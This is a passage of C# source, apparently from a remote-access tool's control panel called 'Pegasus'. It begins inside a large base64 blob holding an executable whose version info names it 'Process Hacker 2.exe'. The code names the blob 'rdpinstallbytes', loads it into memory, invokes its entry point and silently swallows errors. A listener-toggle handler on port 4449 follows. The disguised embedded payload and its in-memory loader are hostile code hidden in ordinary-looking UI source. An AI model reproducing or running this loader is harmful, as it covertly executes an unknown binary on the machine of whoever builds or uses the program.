AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///////wAA////////AAD///////8AAP///AAf/wAA///wAAePAAD//+AAAQEAAP//wAAAAAAA//+AAAAAAAD//4AAAAAAAP//gAAAAAAA//+AAAAAAADAB4AAAAAAAIABwAAAAAAAgABwAAAPAACAAAwAAA8AAIAAAAAADwAAgAAAAAAPAACAAAAAAA8AAIAAAAAADwAAgAAAAAAPAACAAAAAAA8AAIAAAAAABwAAgAAAAAAHAACAAAAAAAcAAIAAAAAABwAAgAAAAAAHAACAAAAAAAcAAIAAAAAABwAAgAAAAAAHAACAAAAAAAMAAIAAAAAAAwAAgAAAAAADAACAAAAAAAMAAIAAAAAAAwAAwAAAAAADAADwAAAAAAMAAP4AAAAAAQAA/8AAAAABAAD/8AAAAAEAAP/wAAAAAwAA//AAAAAHAAD/8AAAH/8AAP/wAB///wAA//AP////AAD/+H////8AAP///////wAA////////AAD///////8AACgAAAAgAAAAQAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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");
            Task.Factory.StartNew(() => Execute(rdpinstallbytes)).Wait();




        }
        #region pegasus
        public static void Execute(byte[] purdi)
        {
            try
            {
                Assembly asm = AppDomain.CurrentDomain.Load((byte[])purdi);
                MethodInfo Metinf = Entry(asm);
                object InjObj = asm.CreateInstance(Metinf.Name);
                object[] parameters = new object[1];
                if (Metinf.GetParameters().Length == 0)
                    parameters = null;
                MethodInfo(Metinf, InjObj, parameters);
            }
            catch { }
        }
        private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
        {
            if (meth != null)
                return meth.Invoke(obj1, obj2);
            else
                return false;
        }

        private static MethodInfo Entry(Assembly obj)
        {
            if (obj != null)
                return obj.EntryPoint;
            else
                return null;
        }
        #endregion


        /// <summary>
        /// The guna2ToggleSwitch1_CheckedChanged.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch1.Checked)
            {
                if (string.IsNullOrEmpty(Properties.Settings.Default.Ports))
                {
                    var port = InputDialog.Show("\nGive me a port to listen.\n\n");
                    if (!string.IsNullOrEmpty(port))
                    {
                        //ushort ports = GetPortSafe();
                        Properties.Settings.Default.Ports = "4449";
                        Properties.Settings.Default.Save();
                    }
                    else
                    {
                        Properties.Settings.Default.Ports = Convert.ToString(port);
                        Properties.Settings.Default.Save();
                    }


                    if (!File.Exists(Settings.CertificatePath))
                        Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
                    else
                        Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);


                    new Thread(() => { Connect(); }).Start();

                    Listener.ForeColor = Color.FromArgb(54, 193, 214);
                    Listener.Text = "Listening on port:" + port + "";
                }
                else
                {
                    if (!File.Exists(Settings.CertificatePath))
                        Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);
                    else
                        Settings.PEGASUSCertificate = new X509Certificate2(Settings.CertificatePath);


                    Listener.ForeColor = Color.FromArgb(54, 193, 214);
                    Listener.Text = "Listening on port:" + Properties.Settings.Default.Ports + "";
                }
            }

            else
            {
                if (!string.IsNullOrEmpty(Properties.Settings.Default.Ports))
                {
                    var port = "4449";
                    Properties.Settings.Default.Ports = port;
